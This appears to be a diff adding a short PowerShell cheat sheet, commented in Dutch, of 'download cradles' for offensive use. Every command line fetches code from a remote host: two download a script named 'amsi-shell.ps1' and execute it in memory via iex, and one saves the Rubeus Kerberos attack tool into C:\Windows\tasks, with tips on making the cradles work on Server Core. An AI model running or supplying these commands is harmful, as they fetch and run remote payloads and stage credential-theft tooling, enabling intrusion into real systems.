@@ -1,0 +1,9 @@
+# PowerShell Download Cradle - Invoke-WebRequest (PS 3.0+)
+# Download + execute in memory
+iex (iwr 'http://10.0.0.1/payloads/amsi-shell.ps1' -UseBasicParsing)
+# Langere versie met variabele:
+$resp = Invoke-WebRequest -Uri 'http://10.0.0.1/payloads/amsi-shell.ps1' -UseBasicParsing; IEX $resp.Content
+# File downloaden naar schijf:
+Invoke-WebRequest -Uri 'http://10.0.0.1/tools/Rubeus.exe' -OutFile 'C:\Windows\tasks\Rubeus.exe'
+# Tip: -UseBasicParsing voorkomt IE engine dependency (werkt op Server Core)
+# Tip: iwr is alias voor Invoke-WebRequest
